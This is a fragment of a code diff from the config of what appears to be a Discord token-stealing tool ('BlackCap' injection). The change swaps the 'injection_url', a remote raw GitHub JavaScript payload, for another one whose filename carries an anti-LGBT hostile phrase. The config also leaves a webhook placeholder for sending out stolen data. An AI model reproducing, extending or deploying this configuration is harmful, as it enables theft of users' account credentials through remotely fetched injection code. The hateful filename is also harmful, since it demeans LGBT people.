@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 000000,
 
-    injection_url: "https://raw.githubusercontent.com/Bada-GF/BlackCap-Inject-nodualhook/main/index.js",
+    injection_url: "https://raw.githubusercontent.com/EyeLoveBigBlackHawks/donotrun/main/.github/lgbt-to-the-ground.js",
     webhook: "%WEBHOOK%",
    Filter: {
         "urls": [
